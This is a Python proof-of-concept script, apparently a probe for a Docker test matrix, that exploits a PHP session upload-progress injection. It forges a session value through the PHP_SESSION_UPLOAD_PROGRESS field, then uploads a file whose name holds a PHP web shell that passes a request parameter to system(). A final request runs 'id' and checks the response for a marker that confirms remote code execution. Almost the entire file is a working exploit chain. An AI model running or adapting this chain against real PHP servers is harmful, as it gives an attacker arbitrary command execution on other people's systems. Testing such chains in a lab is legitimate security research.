#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
chain_probe.py <url> <sess-path-in-container>
SINGLE-purpose chain probe used by docker/run_matrix.sh against an already-
running PHP server:

  1) send multipart POST PHPSESSID=x + PHP_SESSION_UPLOAD_PROGRESS=<forge>,
     then a second POST with a <?php ...?> filename, then GET /index.php
     ?print=id with Cookie PHPSESSID=x.
  2) print whether an [RCE-OUT]-style marker lands in the response body.

sess-path-in-container is passed as the 'page' value baked into the KEY
suffix; the docker driver knows the container-side path of the sess volume.
Exit 0 always (matrix uses output not rc).
"""
import sys, http.client, time

def mpart(fields, files):
    out = b''
    for name, val in fields:
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"\r\n\r\n'
                % name.encode()) + val + b'\r\n'
    for fld, fname, data in files:
        fn = fname if isinstance(fname, bytes) else fname.encode()
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"; filename="%b"\r\n\r\n'
                % (fld.encode(), fn)) + data + b'\r\n'
    return out + b'--BND--\r\n'

def send(host, port, method, path, body=None, hdr=None, timeout=30):
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    h = dict(hdr or {})
    if body is not None:
        h['Content-Length'] = str(len(body))
        h['Content-Type'] = 'multipart/form-data; boundary=BND'
    c.request(method, path, body, h)
    r = c.getresponse()
    d = r.read()
    c.close()
    return r.status, d

def main():
    url = sys.argv[1]
    sess_abs = sys.argv[2]
    host = url.split('://',1)[-1].split(':')[0]
    port = int(url.rsplit(':',1)[-1])
    sid = 'vc01'
    # 1) KEY inject: forge $_SESSION['page']=<sess_abs> via progress KEY suffix
    inj = b'x|a:0:{};page|s:%d:"%s";' % (len(sess_abs), sess_abs.encode())
    b1 = mpart([('PHPSESSID', sid.encode()), ('PHP_SESSION_UPLOAD_PROGRESS', inj)],
               [('f0', 'junk.txt', b'x')])
    print('[chain] inject=%s' % inj)
    print('[chain] req1 -> %s' % (send(host, port, 'POST', '/index.php', b1)[0]))
    # 2) filename carries PHP payload
    fname = b'<?php echo "[RCE-OUT]";system($_REQUEST[c]); ?>'
    b2 = mpart([('PHPSESSID', sid.encode()), ('PHP_SESSION_UPLOAD_PROGRESS', b'poc')],
               [('sh', fname, b'x')])
    print('[chain] req2 -> %s' % (send(host, port, 'POST', '/index.php', b2)[0]))
    # 3) trigger
    st, body = send(host, port, 'GET', '/index.php?c=id', None,
                    {'Cookie': 'PHPSESSID=%s' % sid})
    body = body.decode('latin-1', 'replace')
    print('[chain] req3 -> HTTP %d' % st)
    print('--- body begin ---')
    print(body[:600])
    print('--- body end ---')
    if '[RCE-OUT]' in body:
        print('[chain] CHAIN_WORKS')
    elif 'NO_PAGE' in body:
        print('[chain] CHAIN_BROKEN_NO_PAGE')
    else:
        print('[chain] CHAIN_AMBIGUOUS')

if __name__ == '__main__':
    main()
